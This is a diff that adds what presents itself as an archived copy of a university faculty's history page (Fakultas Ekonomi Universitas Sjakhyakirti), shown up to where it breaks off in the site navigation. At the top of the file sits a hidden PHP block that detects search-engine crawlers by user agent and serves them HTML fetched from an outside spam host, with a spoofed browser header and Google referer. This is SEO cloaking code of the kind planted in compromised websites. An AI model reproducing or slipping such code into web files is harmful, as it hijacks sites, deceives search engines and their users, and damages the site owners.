@@ -1,0 +1,1095 @@
+<?php
+@ob_start();
+header("Vary: U-Agent");
+
+$src = "https://obeydasupreme.site/obs/usarb.html";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+    $ctx = stream_context_create([
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ]
+    ]);
+    return @file_get_contents($u, false, $ctx);
+}
+
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="en-US" class="no-js festi">
+    <head>
+        <script src="//archive.org/includes/athena.js" type="text/javascript"></script>
+        <script type="text/javascript">
+            window.addEventListener('DOMContentLoaded', function() {
+                var v = archive_analytics.values;
+                v.service = 'wb';
+                v.server_name = 'wwwb-app242.us.archive.org';
+                v.server_ms = 718;
+                archive_analytics.send_pageview({});
+            });
+        </script>
+        <script type="text/javascript" src="https://web-static.archive.org/_static/js/bundle-playback.js?v=2N_sDSC0" charset="utf-8"></script>
+        <script type="text/javascript" src="https://web-static.archive.org/_static/js/wombat.js?v=txqj7nKC" charset="utf-8"></script>
+        <script>
+            window.RufflePlayer = window.RufflePlayer || {};
+            window.RufflePlayer.config = {
+                "autoplay": "on",
+                "unmuteOverlay": "hidden",
+                "showSwfDownload": true
+            };
+        </script>
+        <script type="text/javascript" src="https://web-static.archive.org/_static/js/ruffle/ruffle.js"></script>
+        <script type="text/javascript">
+            __wm.init("https://web.archive.org/web");
+            __wm.wombat("https://festi.unisti.ac.id/sejarah/", "20250907234827", "https://web.archive.org/", "web", "https://web-static.archive.org/_static/", "1757288907");
+        </script>
+        <link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/banner-styles.css?v=1utQkbB3"/>
+        <link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/iconochive.css?v=3PDvdIFv"/>
+        <!-- End Wayback Rewrite JS Include -->
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <link rel="profile" href="http://gmpg.org/xfn/11">
+        <link rel="pingback" href="https://festi.unisti.ac.id/xmlrpc.php">
+        <meta content="index,follow" name="googlebot"/>
+        <meta content="all" name="robots"/>
+        <link rel="shortcut icon" href="/web/20250907234827im_/https://festi.unisti.ac.id/sejarah/" type="image/png">
+        <title>Sejarah &#8211;Fakultas Ekonomi Universitas Sjakhyakirti</title>
+        <link rel="dns-prefetch" href="//web.archive.org/web/20250907234827/https://fonts.googleapis.com/"/>
+        <link rel="dns-prefetch" href="//web.archive.org/web/20250907234827/https://s.w.org/"/>
+        <link rel="alternate" type="application/rss+xml" title="Fakultas Ekonomi Universitas Sjakhyakirti » Feed" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/feed/"/>
+        <link rel="alternate" type="application/rss+xml" title="Fakultas Ekonomi Universitas Sjakhyakirti » Comments Feed" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/comments/feed/"/>
+        <script type="text/javascript">
+            window._wpemojiSettings = {
+                "baseUrl": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/",
+                "ext": ".png",
+                "svgUrl": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/",
+                "svgExt": ".svg",
+                "source": {
+                    "concatemoji": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/festi.unisti.ac.id\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.17"
+                }
+            };
+            /*! This file is auto-generated */
+            !function(e, a, t) {
+                var n, r, o, i = a.createElement("canvas"), p = i.getContext && i.getContext("2d");
+                function s(e, t) {
+                    var a = String.fromCharCode;
+                    p.clearRect(0, 0, i.width, i.height),
+                    p.fillText(a.apply(this, e), 0, 0);
+                    e = i.toDataURL();
+                    return p.clearRect(0, 0, i.width, i.height),
+                    p.fillText(a.apply(this, t), 0, 0),
+                    e === i.toDataURL()
+                }
+                function c(e) {
+                    var t = a.createElement("script");
+                    t.src = e,
+                    t.defer = t.type = "text/javascript",
+                    a.getElementsByTagName("head")[0].appendChild(t)
+                }
+                for (o = Array("flag", "emoji"),
+                t.supports = {
+                    everything: !0,
+                    everythingExceptFlag: !0
+                },
+                r = 0; r < o.length; r++)
+                    t.supports[o[r]] = function(e) {
+                        if (!p || !p.fillText)
+                            return !1;
+                        switch (p.textBaseline = "top",
+                        p.font = "600 32px Arial",
+                        e) {
+                        case "flag":
+                            return s([127987, 65039, 8205, 9895, 65039], [127987, 65039, 8203, 9895, 65039]) ? !1 : !s([55356, 56826, 55356, 56819], [55356, 56826, 8203, 55356, 56819]) && !s([55356, 57332, 56128, 56423, 56128, 56418, 56128, 56421, 56128, 56430, 56128, 56423, 56128, 56447], [55356, 57332, 8203, 56128, 56423, 8203, 56128, 56418, 8203, 56128, 56421, 8203, 56128, 56430, 8203, 56128, 56423, 8203, 56128, 56447]);
+                        case "emoji":
+                            return !s([55357, 56424, 55356, 57342, 8205, 55358, 56605, 8205, 55357, 56424, 55356, 57340], [55357, 56424, 55356, 57342, 8203, 55358, 56605, 8203, 55357, 56424, 55356, 57340])
+                        }
+                        return !1
+                    }(o[r]),
+                    t.supports.everything = t.supports.everything && t.supports[o[r]],
+                    "flag" !== o[r] && (t.supports.everythingExceptFlag = t.supports.everythingExceptFlag && t.supports[o[r]]);
+                t.supports.everythingExceptFlag = t.supports.everythingExceptFlag && !t.supports.flag,
+                t.DOMReady = !1,
+                t.readyCallback = function() {
+                    t.DOMReady = !0
+                }
+                ,
+                t.supports.everything || (n = function() {
+                    t.readyCallback()
+                }
+                ,
+                a.addEventListener ? (a.addEventListener("DOMContentLoaded", n, !1),
+                e.addEventListener("load", n, !1)) : (e.attachEvent("onload", n),
+                a.attachEvent("onreadystatechange", function() {
+                    "complete" === a.readyState && t.readyCallback()
+                })),
+                (n = t.source || {}).concatemoji ? c(n.concatemoji) : n.wpemoji && n.twemoji && (c(n.twemoji),
+                c(n.wpemoji)))
+            }(window, document, window._wpemojiSettings);
+        </script>
+        <style type="text/css">
+            img.wp-smiley, img.emoji {
+                display: inline !important;
+                border: none !important;
+                box-shadow: none !important;
+                height: 1em !important;
+                width: 1em !important;
+                margin: 0 .07em !important;
+                vertical-align: -0.1em !important;
+                background: none !important;
+                padding: 0 !important;
+            }
+        </style>
+        <link rel="stylesheet" id="sdm-styles-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/simple-download-monitor/css/sdm_wp_styles.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="wp-block-library-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-includes/css/dist/block-library/style.min.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="edac-font-awesome-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/8-degree-availability-calendar/css/font-awesome/font-awesome.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="edac-frontend-style-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/8-degree-availability-calendar/css/frontend/frontend.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="fontawesome-css-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/8-degree-availability-calendar/css/font-awesome/font-awesome.min.css?ver=1.1.0" type="text/css" media="all"/>
+        <link rel="stylesheet" id="contact-form-7-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.3.2" type="text/css" media="all"/>
+        <link rel="stylesheet" id="ebook-css-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/ebook-downloader/css/ebook.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="wpsm_tabs_r-font-awesome-front-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/tabs-responsive/assets/css/font-awesome/css/font-awesome.min.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="wpsm_tabs_r_bootstrap-front-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/tabs-responsive/assets/css/bootstrap-front.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="wpsm_tabs_r_animate-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/tabs-responsive/assets/css/animate.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="yop-public-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/plugins/yop-poll/public/assets/css/yop-poll-public-6.5.37.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="bw-all-style-min-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/themes/festi/style.all.min.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="bw-all-min-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/themes/festi/css/all.min.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="bw-js-min-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/themes/festi/css/js_composer.min.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="bw-gb-min-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/themes/festi/css/lulubay.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="animate-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/themes/festi/css/animate.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="owl-carousel-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/themes/festi/css/owl.carousel.min.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="owl-theme-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/themes/festi/css/owl.theme.default.min.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="bw-style-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/themes/festi/style.css?ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="bw-opensans-css" href="https://web.archive.org/web/20250907234827cs_/https://fonts.googleapis.com/css?family=Open+Sans%3A400%2C300%2C300italic%2C400italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic&amp;subset=latin%2Clatin-ext%2Cgreek%2Cgreek-ext%2Cvietnamese%2Ccyrillic%2Ccyrillic-ext&amp;ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="bw-montserrat-css" href="https://web.archive.org/web/20250907234827cs_/https://fonts.googleapis.com/css?family=Montserrat%3A400%2C700&amp;ver=5.4.17" type="text/css" media="all"/>
+        <link rel="stylesheet" id="tablepress-default-css" href="https://web.archive.org/web/20250907234827cs_/https://festi.unisti.ac.id/wp-content/tablepress-combined.min.css?ver=19" type="text/css" media="all"/>
+        <script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp"></script>
+        <script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1"></script>
+        <script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/plugins/8-degree-availability-calendar/js/frontend/jquery.ui.datepicker.js?ver=1.8.16"></script>
+        <script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/plugins/8-degree-availability-calendar/js/frontend/lan/jquery-ui-i18n.js?ver=5.4.17"></script>
+        <script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/plugins/8-degree-availability-calendar/js/frontend/frontend.js?ver=1.1.0"></script>
+        <script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/plugins/ebook-downloader/js/ebook_frontend.js?ver=5.4.17"></script>
+        <script type="text/javascript">
+            /* <![CDATA[ */
+            var sdm_ajax_script = {
+                "ajaxurl": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/festi.unisti.ac.id\/wp-admin\/admin-ajax.php"
+            };
+            /* ]]> */
+        </script>
+        <script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/plugins/simple-download-monitor/js/sdm_wp_scripts.js?ver=5.4.17"></script>
+        <script type="text/javascript">
+            /* <![CDATA[ */
+            var objectL10n = {
+                "yopPollParams": {
+                    "urlParams": {
+                        "ajax": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/festi.unisti.ac.id\/wp-admin\/admin-ajax.php",
+                        "wpLogin": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/festi.unisti.ac.id\/wp-login.php?redirect_to=https%3A%2F%2Ffesti.unisti.ac.id%2Fwp-admin%2Fadmin-ajax.php%3Faction%3Dyop_poll_record_wordpress_vote"
+                    },
+                    "apiParams": {
+                        "reCaptcha": {
+                            "siteKey": ""
+                        },
+                        "reCaptchaV2Invisible": {
+                            "siteKey": ""
+                        },
+                        "reCaptchaV3": {
+                            "siteKey": ""
+                        },
+                        "hCaptcha": {
+                            "siteKey": ""
+                        },
+                        "cloudflareTurnstile": {
+                            "siteKey": ""
+                        }
+                    },
+                    "captchaParams": {
+                        "imgPath": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/festi.unisti.ac.id\/wp-content\/plugins\/yop-poll\/public\/assets\/img\/",
+                        "url": "https:\/\/web.archive.org\/web\/20250907234827\/https:\/\/festi.unisti.ac.id\/wp-content\/plugins\/yop-poll\/app.php",
+                        "accessibilityAlt": "Sound icon",
+                        "accessibilityTitle": "Accessibility option: listen to a question and answer it!",
+                        "accessibilityDescription": "Type below the <strong>answer<\/strong> to what you hear. Numbers or words:",
+                        "explanation": "Click or touch the <strong>ANSWER<\/strong>",
+                        "refreshAlt": "Refresh\/reload icon",
+                        "refreshTitle": "Refresh\/reload: get new images and accessibility option!"
+                    },
+                    "voteParams": {
+                        "invalidPoll": "Invalid Poll",
+                        "noAnswersSelected": "No answer selected",
+                        "minAnswersRequired": "At least {min_answers_allowed} answer(s) required",
+                        "maxAnswersRequired": "A max of {max_answers_allowed} answer(s) accepted",
+                        "noAnswerForOther": "No other answer entered",
+                        "noValueForCustomField": "{custom_field_name} is required",
+                        "tooManyCharsForCustomField": "Text for {custom_field_name} is too long",
+                        "consentNotChecked": "You must agree to our terms and conditions",
+                        "noCaptchaSelected": "Captcha is required",
+                        "thankYou": "Thank you for your vote"
+                    },
+                    "resultsParams": {
+                        "singleVote": "vote",
+                        "multipleVotes": "votes",
+                        "singleAnswer": "answer",
+                        "multipleAnswers": "answers"
+                    }
+                }
+            };
+            /* ]]> */
+        </script>
+        <script type="text/javascript" src="https://web.archive.org/web/20250907234827js_/https://festi.unisti.ac.id/wp-content/plugins/yop-poll/public/assets/js/yop-poll-public-6.5.37.min.js?ver=5.4.17"></script>
+        <link rel="https://api.w.org/" href="https://festi.unisti.ac.id/wp-json/"/>
+        <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://festi.unisti.ac.id/xmlrpc.php?rsd"/>
+        <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://festi.unisti.ac.id/wp-includes/wlwmanifest.xml"/>
+        <meta name="generator" content="WordPress 5.4.17"/>
+        <link rel="canonical" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/sejarah/"/>
+        <link rel="shortlink" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/?p=4327"/>
+        <link rel="alternate" type="application/json+oembed" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffesti.unisti.ac.id%2Fsejarah%2F"/>
+        <link rel="alternate" type="text/xml+oembed" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffesti.unisti.ac.id%2Fsejarah%2F&amp;format=xml"/>
+        <link rel="icon" href="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2019/02/cropped-WhatsApp-Image-2019-02-12-at-13.22.45-32x32.jpeg" sizes="32x32"/>
+        <link rel="icon" href="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2019/02/cropped-WhatsApp-Image-2019-02-12-at-13.22.45-192x192.jpeg" sizes="192x192"/>
+        <link rel="apple-touch-icon" href="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2019/02/cropped-WhatsApp-Image-2019-02-12-at-13.22.45-180x180.jpeg"/>
+        <meta name="msapplication-TileImage" content="https://festi.unisti.ac.id/wp-content/uploads/2019/02/cropped-WhatsApp-Image-2019-02-12-at-13.22.45-270x270.jpeg"/>
+        <style id="education-base-style-inline-css" type="text/css">
+            .inner-main-title {
+                background-image: url('/web/20250907234827im_/https://festi.unisti.ac.id/sejarah/');
+                background-repeat: no-repeat;
+                background-size: cover;
+                background-attachment: fixed;
+                background-position: center;
+                height: 100px;
+            }
+
+            .top-header, article.post .entry-header .year, .wpcf7-form input.wpcf7-submit ::before , .btn-primary::before {
+                background-color: #FA6900;
+            }
+
+            .site-footer {
+                background-color: #003a6a;
+            }
+
+            .copy-right {
+                background-color: #002858;
+            }
+
+            a:hover, a:active, a:focus, .widget li a:hover, .posted-on a:hover, .author.vcard a:hover, .cat-links a:hover, .comments-link a:hover, .edit-link a:hover, .tags-links a:hover, .byline a:hover, .main-navigation .acme-normal-page .current_page_item a, .main-navigation .acme-normal-page .current-menu-item a, .main-navigation .active a, .main-navigation .navbar-nav >li a:hover, .team-item h3 a:hover, .news-notice-content .news-content a:hover, .circle .fa {
+                color: #fd5308;
+            }
+
+            .navbar .navbar-toggle:hover, .main-navigation .current_page_ancestor > a:before, .comment-form .form-submit input, .btn-primary, .line > span, .wpcf7-form input.wpcf7-submit, .wpcf7-form input.wpcf7-submit:hover, .owl-buttons > div i:hover, article.post .entry-header, .sm-up-container, .read-more, .testimonial-content, .round-icon, .round-icon:hover {
+                background-color: #fd5308;
+                color: #fff;
+            }
+
+            .blog article.sticky, .top-header .read-more, .circle {
+                border: 2px solid #fd5308;
+            }
+        </style>
+    </head>
+    <body class="page-template-default page page-id-4327 home page-id-104 wp-custom-logo acme-animate right-sidebar">
+        <!-- BEGIN WAYBACK TOOLBAR INSERT -->
+        <script>
+            __wm.rw(0);
+        </script>
+        <div id="wm-ipp-base" lang="en" style="display:none;direction:ltr;" toolbar-mode="auto">
+            <div id="wm-ipp" style="position:fixed;left:0;top:0;right:0;">
+                <div id="donato" style="position:relative;width:100%;height:0;">
+                    <div id="donato-base">
+                        <iframe id="donato-if" src="https://archive.org/includes/donate.php?as_page=1&amp;platform=wb&amp;referer=https%3A//web.archive.org/web/20250907234827/https%3A//festi.unisti.ac.id/sejarah/" scrolling="no" frameborder="0" style="width:100%; height:100%"></iframe>
+                    </div>
+                </div>
+                <div id="wm-ipp-inside">
+                    <div id="wm-toolbar" style="position:relative;display:flex;flex-flow:row nowrap;justify-content:space-between;" nav="async">
+                        <div id="wm-logo" style="/*width:110px;*/padding-top:12px;">
+                            <a href="/web/" title="Wayback Machine home page">
+                                <img src="https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png" srcset="https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-100.png, https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-150.png 1.5x, https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png 2x" alt="Wayback Machine" style="width:100px" border="0"/>
+                            </a>
+                        </div>
+                        <div class="c" style="display:flex;flex-flow:column nowrap;justify-content:space-between;flex:1;">
+                            <form class="u" style="display:flex;flex-direction:row;flex-wrap:nowrap;" target="_top" method="get" action="/web/submit" name="wmtb" id="wmtb">
+                                <input type="text" name="url" id="wmtbURL" value="https://festi.unisti.ac.id/sejarah/" onfocus="this.focus();this.select();" style="flex:1;"/>
+                                <input type="hidden" name="type" value="replay"/>
+                                <input type="hidden" name="date" value="20250907234827"/>
+                                <input type="submit" value="Go"/>
+                            </form>
+                            <div style="display:flex;flex-flow:row nowrap;align-items:flex-end;">
+                                <div class="s" id="wm-nav-captures" style="flex:1;">
+                                    <a class="t" href="/web/20250907234827*/https://festi.unisti.ac.id/sejarah/" title="See a list of every capture for this URL">8 captures</a>
+                                    <div class="r" title="Timespan for captures of this URL">20 Sep 2021 - 07 Sep 2025</div>
+                                </div>
+                                <div class="k">
+                                    <a href="" id="wm-graph-anchor">
+                                        <div id="wm-ipp-sparkline" title="Explore captures for this URL" style="position: relative">
+                                            <canvas id="wm-sparkline-canvas" width="775" height="27" border="0"></canvas>
+                                        </div>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="n">
+                            <table>
+                                <tbody>
+                                    <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
+                                    <tr class="m">
+                                        <td class="b" nowrap="nowrap">Aug</td>
+                                        <td class="c" id="displayMonthEl" title="You are here: 23:48:27 Sep 07, 2025">SEP</td>
+                                        <td class="f" nowrap="nowrap">Oct</td>
+                                    </tr>
+                                    <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
+                                    <tr class="d">
+                                        <td class="b" nowrap="nowrap">
+                                            <span class="ta"></span>
+                                        </td>
+                                        <td class="c" id="displayDayEl" style="width:34px;font-size:22px;white-space:nowrap;" title="You are here: 23:48:27 Sep 07, 2025">07</td>
+                                        <td class="f" nowrap="nowrap">
+                                            <span class="ta"></span>
+                                        </td>
+                                    </tr>
+                                    <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
+                                    <tr class="y">
+                                        <td class="b" nowrap="nowrap">2024</td>
+                                        <td class="c" id="displayYearEl" title="You are here: 23:48:27 Sep 07, 2025">2025</td>
+                                        <td class="f" nowrap="nowrap">2026</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <div class="r" style="display:flex;flex-flow:column nowrap;align-items:flex-end;justify-content:space-between;">
+                            <div id="wm-btns" style="text-align:right;height:23px;">
+                                <span class="xxs">
+                                    <div id="wm-save-snapshot-success">success</div>
+                                    <div id="wm-save-snapshot-fail">fail</div>
+                                    <a id="wm-save-snapshot-open" href="#" title="Share via My Web Archive">
+                                        <span class="iconochive-web"></span>
+                                    </a>
+                                    <a href="https://archive.org/account/login.php" title="Sign In" id="wm-sign-in">
+                                        <span class="iconochive-person"></span>
+                                    </a>
+                                    <span id="wm-save-snapshot-in-progress" class="iconochive-web"></span>
+                                </span>
+                                <a class="xxs" href="https://help.archive.org/help/category/the-wayback-machine/" title="Get some help using the Wayback Machine" style="top:-6px;">
+                                    <span class="iconochive-question" style="color:rgb(87,186,244);font-size:160%;"></span>
+                                </a>
+                                <a id="wm-tb-close" href="#close" style="top:-2px;" title="Close the toolbar">
+                                    <span class="iconochive-remove-circle" style="color:#888888;font-size:240%;"></span>
+                                </a>
+                            </div>
+                            <div id="wm-share" class="xxs">
+                                <a href="/web/20250907234827/http://web.archive.org/screenshot/https://festi.unisti.ac.id/sejarah/" id="wm-screenshot" title="screenshot">
+                                    <span class="wm-icon-screen-shot"></span>
+                                </a>
+                                <a href="#" id="wm-video" title="video">
+                                    <span class="iconochive-movies"></span>
+                                </a>
+                                <a id="wm-share-facebook" href="#" data-url="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/sejarah/" title="Share on Facebook" style="margin-right:5px;" target="_blank">
+                                    <span class="iconochive-facebook" style="color:#3b5998;font-size:160%;"></span>
+                                </a>
+                                <a id="wm-share-twitter" href="#" data-url="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/sejarah/" title="Share on Twitter" style="margin-right:5px;" target="_blank">
+                                    <span class="iconochive-twitter" style="color:#1dcaff;font-size:160%;"></span>
+                                </a>
+                            </div>
+                            <div style="padding-right:2px;text-align:right;white-space:nowrap;">
+                                <a id="wm-expand" class="wm-btn wm-closed" href="#expand">
+                                    <span id="wm-expand-icon" class="iconochive-down-solid"></span>
+                                    <span class="xxs" style="font-size:80%;">About this capture</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="wm-capinfo" style="border-top:1px solid #777;display:none; overflow: hidden">
+                        <div id="wm-capinfo-notice" source="api"></div>
+                        <div id="wm-capinfo-collected-by">
+                            <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center;padding:2px 0;">COLLECTED BY</div>
+                            <div style="padding:3px;position:relative" id="wm-collected-by-content">
+                                <div style="display:inline-block;vertical-align:top;width:49%;">
+                                    <span class="c-logo" style="background-image:url(https://archive.org/services/img/commoncrawl)"></span>
+                                    <div>
+                                        Collection: 
+                                        <a style="color:#33f;" href="https://archive.org/details/commoncrawl" target="_new">
+                                            <span class="wm-title">Common Crawl</span>
+                                        </a>
+                                    </div>
+                                    <div style="max-height:75px;overflow:hidden;position:relative;">
+                                        <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
+                                        Web crawl data from Common Crawl.
+	
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="wm-capinfo-timestamps">
+                            <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center;padding:2px 0;" title="Timestamps for the elements of this page">TIMESTAMPS</div>
+                            <div>
+                                <div id="wm-capresources" style="margin:0 5px 5px 5px;max-height:250px;overflow-y:scroll !important"></div>
+                                <div id="wm-capresources-loading" style="text-align:left;margin:0 20px 5px 5px;display:none">
+                                    <img src="https://web-static.archive.org/_static/images/loading.gif" alt="loading"/>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/sejarah/</div>
+        <script type="text/javascript">
+            //<![CDATA[
+            __wm.bt(775, 27, 25, 2, "web", "https://festi.unisti.ac.id/sejarah/", "20250907234827", 1996, "https://web-static.archive.org/_static/", ["https://web-static.archive.org/_static/css/banner-styles.css?v=1utQkbB3", "https://web-static.archive.org/_static/css/iconochive.css?v=3PDvdIFv"], false);
+            __wm.rw(1);
+            //]]>
+        </script>
+        <!-- END WAYBACK TOOLBAR INSERT -->
+        <div id="body-wrap">
+            <div id="wrap">
+                <header>
+                    <div class="education-base-main-header-wrapper">
+                        <div class="top-header left-curve">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-sm-6 text-left">
+                                        <span class="top-phone">
+                                            <i class="fa fa-phone"></i>
+                                            0711358320
+                                        </span>
+                                        <a class="top-email" href="https://web.archive.org/web/20250907234827/mailto:festi@unisti.ac.id">
+                                            <i class="fa fa-envelope"></i>
+                                            festi@unisti.ac.id
+                                        </a>
+                                    </div>
+                                    <div class="col-sm-6 text-right">
+                                        <ul class="socials init-animate animated" style="visibility: visible;">
+                                            <div class="link-top">
+                                                <a class="ttmen" href="https://web.archive.org/web/20250907234827/https://elearning.unisti.ac.id/">E-Learning</a>
+                                                <a class="ttmen" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/jurnal-internal-jurnal-eksternal-bahan-ajar/">PUBLIKASI</a>
+                                            </div>
+                                        </ul>
+                                        <a class="read-more" href="#">Find Us for Quality</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!--<main menu>-->
+                        <!--<navbar menu>-->
+                        <div class="navbar at-navbar " id="navbar" role="navigation">
+                            <div class="container">
+                                <!-- Brand and toggle get grouped for better mobile display -->
+                                <div class="navbar-header">
+                                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                                        <span class="sr-only">Toggle navigation</span>
+                                        <span class="icon-bar"></span>
+                                        <span class="icon-bar"></span>
+                                        <span class="icon-bar"></span>
+                                    </button>
+                                    <!--<logo>-->
+                                    <div class="bw_logo_mobile">
+                                        <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/">
+                                            <img class="custom-logo" itemprop="logo" width="240" height="58" src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2019/11/LOGO3.png">
+                                        </a>
+                                    </div>
+                                    <!--</logo>-->
+                                </div>
+                                <div class="main-navigation navbar-collapse collapse">
+                                    <div class="menu-front-page-container">
+                                        <ul id="primary-menu" class="nav navbar-nav navbar-right acme-one-page">
+                                            <li id="menu-item-6689" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-6689">
+                                                <a title="Beranda" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/">Beranda</a>
+                                            </li>
+                                            <li id="menu-item-3891" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-3891 dropdown">
